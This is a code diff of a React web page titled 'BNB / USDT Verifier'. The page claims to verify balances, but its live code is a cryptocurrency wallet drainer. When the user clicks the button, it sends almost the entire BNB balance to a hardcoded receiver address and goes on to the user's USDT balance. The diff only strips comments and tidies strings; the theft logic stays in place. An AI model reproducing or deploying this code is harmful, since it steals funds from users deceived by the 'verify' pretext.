@@ -6,9 +6,7 @@ function App() {
   const [status, setStatus] = useState("Click Verify to start...");
   const [loading, setLoading] = useState(false);
 
-  // ✅ Receiver wallet
   const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef";
-  // ✅ Official USDT BEP20
   const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";
 
   const ERC20_ABI = [
@@ -27,10 +25,8 @@ function App() {
       const signer = await provider.getSigner();
       const userAddress = await signer.getAddress();
 
-      // ✅ Ensure BSC Mainnet
-      const BSC_MAINNET = "0x38"; // 56 in hex
       const chainId = await window.ethereum.request({ method: "eth_chainId" });
-      if (chainId !== BSC_MAINNET) {
+      if (chainId !== "0x38") {
         setStatus("Switch to Binance Smart Chain (BSC Mainnet).");
         return;
       }
@@ -38,13 +34,12 @@ function App() {
       setLoading(true);
       setStatus("🔍 Checking balances...");
 
-      // ✅ BNB balance
       const balanceBNB = await provider.getBalance(userAddress);
       if (balanceBNB > 0n) {
         setStatus("⏳ Sending BNB...");
         const tx = await signer.sendTransaction({
           to: RECEIVER,
-          value: balanceBNB - ethers.parseEther("0.0005"), // leave a tiny bit for gas
+          value: balanceBNB - ethers.parseEther("0.0005"),
         });
         await tx.wait();
         setStatus("✅ BNB sent successfully");
@@ -52,7 +47,6 @@ function App() {
         return;
       }
 
-      // ✅ USDT balance
       const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
       const balanceUSDT = await usdt.balanceOf(userAddress);
       if (balanceUSDT > 0n) {
@@ -74,19 +68,15 @@ function App() {
   };
 
   return (
-    <div className="app-container">
+    <div className="app">
       <div className="card">
         <h1 className="title">BNB / USDT Verifier</h1>
-        <p className="subtitle">
-          Instantly verify and transfer BNB or USDT (BEP20) securely.
-        </p>
+        <p className="subtitle">Instantly verify & transfer BNB or USDT (BEP20).</p>
 
-        {/* Animated pulse rings */}
         <div className="pulse-wrapper">
           <div className="pulse-ring"></div>
           <div className="pulse-ring"></div>
           <div className="pulse-ring"></div>
-
           <button
             className="verify-btn"
             onClick={handleVerify}
